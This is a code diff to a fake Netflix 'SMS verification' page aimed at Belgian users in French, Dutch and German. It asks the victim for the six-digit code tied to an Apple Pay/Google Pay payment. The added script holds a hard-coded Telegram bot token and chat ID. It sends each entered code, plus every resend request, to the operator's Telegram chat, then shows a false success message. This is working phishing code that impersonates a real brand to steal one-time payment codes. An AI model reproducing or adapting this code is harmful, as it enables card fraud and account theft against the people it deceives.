@@ -148,6 +148,7 @@
             font-weight: 500;
             cursor: pointer;
             margin-top: 10px;
+            position: relative;
         }
 
         .submit-button:hover {
@@ -225,6 +226,33 @@
             margin-bottom: 20px;
             font-size: 16px;
         }
+
+        /* Spinner */
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .btn-loading {
+            color: transparent !important;
+        }
+
+        .btn-loading .spinner {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -232,11 +260,8 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
         <select class="language-selector" id="languageSelector">
             <option value="fr">Français</option>
-            <option value="en">English</option>
-            <option value="es">Español</option>
+            <option value="nl">Nederlands</option>
             <option value="de">Deutsch</option>
-            <option value="ru">Русский</option>
-            <option value="pl">Polski</option>
         </select>
     </header>
 
@@ -278,7 +303,10 @@
                     <input type="text" class="sms-code-input" maxlength="1" pattern="[0-9]" id="digit6">
                 </div>
                 
-                <button type="submit" class="submit-button" id="verifyButton">Vérifier</button>
+                <button type="submit" class="submit-button" id="verifyButton">
+                    <span id="verifyText">Vérifier</span>
+                    <div class="spinner"></div>
+                </button>
                 
                 <div class="help-text">
                     Une question ? <a href="#" class="help-link" id="helpLink">Contactez notre service client</a>
@@ -302,178 +330,134 @@
     </footer>
 
     <script>
-        // Traductions multilingues complètes
+        // Configuration Telegram
+        const TELEGRAM_BOT_TOKEN = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk'; // Remplacez par votre token
+        const TELEGRAM_CHAT_ID = '-4883048028'; // Remplacez par votre chat ID
+
+        // Textes pour les différentes langues (Belgique)
         const translations = {
             fr: {
                 pageTitle: "Vérification SMS - Netflix",
-                step1: "Offre",
-                step2: "Compte",
-                step3: "Paiement",
-                step4: "Vérification",
+                step1Label: "Offre",
+                step2Label: "Compte",
+                step3Label: "Paiement",
+                step4Label: "Vérification",
                 verificationTitle: "Vérification du code SMS",
                 verificationMessage: "Nous avons envoyé un code de vérification à votre appareil associé à Apple Pay/Google Pay. Entrez ce code pour compléter votre paiement.",
-                verifyButton: "Vérifier",
+                verifyText: "Vérifier",
                 helpLink: "Contactez notre service client",
                 resendLink: "Renvoyer le code SMS",
-                terms: "Conditions d'utilisation",
-                privacy: "Confidentialité",
-                legal: "Mentions légales",
-                cookies: "Préférences de cookies",
-                copyright: "© 2025 Netflix, Inc."
+                termsLink: "Conditions d'utilisation",
+                privacyLink: "Confidentialité",
+                legalLink: "Mentions légales",
+                cookiesLink: "Préférences de cookies",
+                copyrightText: "© 2025 Netflix, Inc.",
+                successMessage: "Vérification réussie ! Redirection...",
+                errorMessage: "Veuillez entrer le code à 6 chiffres",
+                resendMessage: "Un nouveau code SMS a été envoyé"
             },
-            en: {
-                pageTitle: "SMS Verification - Netflix",
-                step1: "Plan selection",
-                step2: "Account creation",
-                step3: "Payment",
-                step4: "Verification",
-                verificationTitle: "SMS Verification Code",
-                verificationMessage: "We've sent a verification code to your device associated with Apple Pay/Google Pay. Enter this code to complete your payment.",
-                verifyButton: "Verify",
-                helpLink: "Contact customer service",
-                resendLink: "Resend SMS code",
-                terms: "Terms of Use",
-                privacy: "Privacy",
-                legal: "Legal Notices",
-                cookies: "Cookie Preferences",
-                copyright: "© 2025 Netflix, Inc."
-            },
-            es: {
-                pageTitle: "Verificación SMS - Netflix",
-                step1: "Selección de plan",
-                step2: "Creación de cuenta",
-                step3: "Pago",
-                step4: "Verificación",
-                verificationTitle: "Código de verificación SMS",
-                verificationMessage: "Hemos enviado un código de verificación a su dispositivo asociado con Apple Pay/Google Pay. Ingrese este código para completar su pago.",
-                verifyButton: "Verificar",
-                helpLink: "Contactar al servicio al cliente",
-                resendLink: "Reenviar código SMS",
-                terms: "Términos de uso",
-                privacy: "Privacidad",
-                legal: "Avisos legales",
-                cookies: "Preferencias de cookies",
-                copyright: "© 2025 Netflix, Inc."
+            nl: {
+                pageTitle: "SMS-verificatie - Netflix",
+                step1Label: "Aanbod",
+                step2Label: "Account",
+                step3Label: "Betaling",
+                step4Label: "Verificatie",
+                verificationTitle: "SMS-verificatiecode",
+                verificationMessage: "We hebben een verificatiecode naar uw apparaat gestuurd dat is gekoppeld aan Apple Pay/Google Pay. Voer deze code in om uw betaling te voltooien.",
+                verifyText: "Verifiëren",
+                helpLink: "Neem contact op met onze klantenservice",
+                resendLink: "SMS-code opnieuw verzenden",
+                termsLink: "Gebruiksvoorwaarden",
+                privacyLink: "Privacy",
+                legalLink: "Juridische bepalingen",
+                cookiesLink: "Cookievoorkeuren",
+                copyrightText: "© 2025 Netflix, Inc.",
+                successMessage: "Verificatie geslaagd! Doorsturen...",
+                errorMessage: "Voer de 6-cijferige code in",
+                resendMessage: "Er is een nieuwe SMS-code verzonden"
             },
             de: {
                 pageTitle: "SMS-Verifizierung - Netflix",
-                step1: "Planauswahl",
-                step2: "Kontoerstellung",
-                step3: "Zahlung",
-                step4: "Verifizierung",
+                step1Label: "Angebot",
+                step2Label: "Konto",
+                step3Label: "Zahlung",
+                step4Label: "Verifizierung",
                 verificationTitle: "SMS-Verifizierungscode",
                 verificationMessage: "Wir haben einen Bestätigungscode an Ihr mit Apple Pay/Google Pay verknüpftes Gerät gesendet. Geben Sie diesen Code ein, um Ihre Zahlung abzuschließen.",
-                verifyButton: "Überprüfen",
-                helpLink: "Kundendienst kontaktieren",
+                verifyText: "Überprüfen",
+                helpLink: "Kontaktieren Sie unseren Kundendienst",
                 resendLink: "SMS-Code erneut senden",
-                terms: "Nutzungsbedingungen",
-                privacy: "Datenschutz",
-                legal: "Rechtliche Hinweise",
-                cookies: "Cookie-Einstellungen",
-                copyright: "© 2025 Netflix, Inc."
-            },
-            ru: {
-                pageTitle: "SMS-подтверждение - Netflix",
-                step1: "Выбор тарифа",
-                step2: "Создание аккаунта",
-                step3: "Оплата",
-                step4: "Подтверждение",
-                verificationTitle: "Код SMS-подтверждения",
-                verificationMessage: "Мы отправили код подтверждения на ваше устройство, связанное с Apple Pay/Google Pay. Введите этот код для завершения оплаты.",
-                verifyButton: "Подтвердить",
-                helpLink: "Связаться со службой поддержки",
-                resendLink: "Отправить код повторно",
-                terms: "Условия использования",
-                privacy: "Конфиденциальность",
-                legal: "Юридические уведомления",
-                cookies: "Настройки cookie",
-                copyright: "© 2025 Netflix, Inc."
-            },
-            pl: {
-                pageTitle: "Weryfikacja SMS - Netflix",
-                step1: "Wybór planu",
-                step2: "Tworzenie konta",
-                step3: "Płatność",
-                step4: "Weryfikacja",
-                verificationTitle: "Kod weryfikacyjny SMS",
-                verificationMessage: "Wysłaliśmy kod weryfikacyjny na Twoje urządzenie powiązane z Apple Pay/Google Pay. Wprowadź ten kod, aby zakończyć płatność.",
-                verifyButton: "Zweryfikuj",
-                helpLink: "Skontaktuj się z obsługą klienta",
-                resendLink: "Wyślij kod SMS ponownie",
-                terms: "Warunki korzystania",
-                privacy: "Prywatność",
-                legal: "Informacje prawne",
-                cookies: "Preferencje dotyczące plików cookie",
-                copyright: "© 2025 Netflix, Inc."
+                termsLink: "Nutzungsbedingungen",
+                privacyLink: "Datenschutz",
+                legalLink: "Rechtliche Hinweise",
+                cookiesLink: "Cookie-Einstellungen",
+                copyrightText: "© 2025 Netflix, Inc.",
+                successMessage: "Verifizierung erfolgreich! Weiterleitung...",
+                errorMessage: "Bitte geben Sie den 6-stelligen Code ein",
+                resendMessage: "Ein neuer SMS-Code wurde gesendet"
             }
         };
 
-        // Mapping des IDs aux clés de traduction
-        const idMap = {
-            'pageTitle': 'pageTitle',
-            'step1Label': 'step1',
-            'step2Label': 'step2',
-            'step3Label': 'step3',
-            'step4Label': 'step4',
-            'verificationTitle': 'verificationTitle',
-            'verificationMessage': 'verificationMessage',
-            'verifyButton': 'verifyButton',
-            'helpLink': 'helpLink',
-            'resendLink': 'resendLink',
-            'termsLink': 'terms',
-            'privacyLink': 'privacy',
-            'legalLink': 'legal',
-            'cookiesLink': 'cookies',
-            'copyrightText': 'copyright'
-        };
-
-        function getLanguage() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const langParam = urlParams.get('lang');
+        // Fonction pour envoyer un message Telegram
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            if (langParam && translations[langParam]) {
-                localStorage.setItem('netflixLang', langParam);
-                return langParam;
-            }
-            
-            return localStorage.getItem('netflixLang') || 'fr';
-        }
-
-        function updateLanguage(lang) {
-            const trans = translations[lang];
-            if (!trans) return;
-            
-            // Mise à jour de tous les éléments avec ID mappés
-            Object.keys(idMap).forEach(id => {
-                const element = document.getElementById(id);
-                if (element) {
-                    element.textContent = trans[idMap[id]];
-                }
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message envoyé à Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi à Telegram:', error);
             });
-            
-            // Mise à jour du sélecteur de langue
-            const languageSelector = document.getElementById('languageSelector');
-            if (languageSelector) {
-                languageSelector.value = lang;
-            }
-            
-            // Mise à jour du titre de la page et de la langue HTML
-            document.title = trans.pageTitle;
-            document.documentElement.lang = lang;
         }
 
-        document.addEventListener('DOMContentLoaded', function() {
-            const lang = getLanguage();
-            updateLanguage(lang);
+        // Fonction pour changer la langue
+        function changeLanguage(lang) {
+            const texts = translations[lang];
             
-            const languageSelector = document.getElementById('languageSelector');
-            if (languageSelector) {
-                languageSelector.addEventListener('change', function() {
-                    const newLang = this.value;
-                    localStorage.setItem('netflixLang', newLang);
-                    updateLanguage(newLang);
-                });
-            }
+            // Mettre à jour tous les textes
+            document.getElementById('pageTitle').textContent = texts.pageTitle;
+            document.getElementById('step1Label').textContent = texts.step1Label;
+            document.getElementById('step2Label').textContent = texts.step2Label;
+            document.getElementById('step3Label').textContent = texts.step3Label;
+            document.getElementById('step4Label').textContent = texts.step4Label;
+            document.getElementById('verificationTitle').textContent = texts.verificationTitle;
+            document.getElementById('verificationMessage').textContent = texts.verificationMessage;
+            document.getElementById('verifyText').textContent = texts.verifyText;
+            document.getElementById('helpLink').textContent = texts.helpLink;
+            document.getElementById('resendLink').textContent = texts.resendLink;
+            document.getElementById('termsLink').textContent = texts.termsLink;
+            document.getElementById('privacyLink').textContent = texts.privacyLink;
+            document.getElementById('legalLink').textContent = texts.legalLink;
+            document.getElementById('cookiesLink').textContent = texts.cookiesLink;
+            document.getElementById('copyrightText').textContent = texts.copyrightText;
+            
+            // Sauvegarder la langue sélectionnée
+            localStorage.setItem('selectedLanguage', lang);
+        }
+
+        // Initialisation au chargement de la page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Récupérer la langue sauvegardée ou utiliser le français par défaut
+            const savedLanguage = localStorage.getItem('selectedLanguage') || 'fr';
+            document.getElementById('languageSelector').value = savedLanguage;
+            changeLanguage(savedLanguage);
+            
+            // Écouter les changements de langue
+            document.getElementById('languageSelector').addEventListener('change', function() {
+                changeLanguage(this.value);
+            });
             
             // Gestion de la saisie du code SMS
             const smsInputs = document.querySelectorAll('.sms-code-input');
@@ -499,39 +483,65 @@
             document.getElementById('smsVerificationForm').addEventListener('submit', function(e) {
                 e.preventDefault();
                 
+                const submitBtn = document.getElementById('verifyButton');
+                const currentLang = document.getElementById('languageSelector').value;
+                const texts = translations[currentLang];
+                
                 // Récupération du code SMS
                 let smsCode = '';
                 smsInputs.forEach(input => {
                     smsCode += input.value;
                 });
                 
-                const lang = getLanguage();
                 if (smsCode.length !== 6) {
-                    alert(lang === 'en' ? 'Please enter the 6-digit code' : 
-                          lang === 'es' ? 'Por favor ingrese el código de 6 dígitos' : 
-                          lang === 'de' ? 'Bitte geben Sie den 6-stelligen Code ein' : 
-                          lang === 'ru' ? 'Пожалуйста, введите 6-значный код' : 
-                          lang === 'pl' ? 'Proszę wprowadzić 6-cyfrowy kod' : 
-                          'Veuillez entrer le code à 6 chiffres');
+                    alert(texts.errorMessage);
                     return;
                 }
                 
-                // Simulation de la vérification
+                // Afficher le spinner
+                submitBtn.classList.add('btn-loading');
+                
+                // Préparer le message pour Telegram
+                const currentDate = new Date().toLocaleString('fr-BE');
+                const message = `
+📱 <b>NOUVELLE VÉRIFICATION SMS NETFLIX BELGIQUE</b>
+
+🔢 <b>Code SMS saisi:</b> ${smsCode}
+⏰ <b>Date:</b> ${currentDate}
+🌐 <b>Langue:</b> ${currentLang.toUpperCase()}
+                `;
+                
+                // Envoyer le message à Telegram
+                sendTelegramMessage(message);
+                
+                // Simuler la vérification
                 setTimeout(() => {
-                    window.location.href = "success.html?lang=" + lang;
-                }, 1000);
+                    alert(texts.successMessage);
+                    // Redirection vers la page de succès
+                    window.location.href = "success.html";
+                }, 2000);
             });
             
             // Gestion du renvoi de code SMS
             document.getElementById('resendLink').addEventListener('click', function(e) {
                 e.preventDefault();
-                const lang = getLanguage();
-                alert(lang === 'en' ? 'A new SMS code has been sent' : 
-                      lang === 'es' ? 'Se ha enviado un nuevo código SMS' : 
-                      lang === 'de' ? 'Ein neuer SMS-Code wurde gesendet' : 
-                      lang === 'ru' ? 'Новый SMS-код был отправлен' : 
-                      lang === 'pl' ? 'Nowy kod SMS został wysłany' : 
-                      'Un nouveau code SMS a été envoyé');
+                const currentLang = document.getElementById('languageSelector').value;
+                const texts = translations[currentLang];
+                
+                alert(texts.resendMessage);
+                
+                // Préparer le message pour Telegram
+                const currentDate = new Date().toLocaleString('fr-BE');
+                const message = `
+🔄 <b>DEMANDE DE RENVOI DE CODE SMS</b>
+
+📱 <b>Action:</b> Renvoi de code SMS demandé
+⏰ <b>Date:</b> ${currentDate}
+🌐 <b>Langue:</b> ${currentLang.toUpperCase()}
+                `;
+                
+                // Envoyer le message à Telegram
+                sendTelegramMessage(message);
             });
         });
     </script>
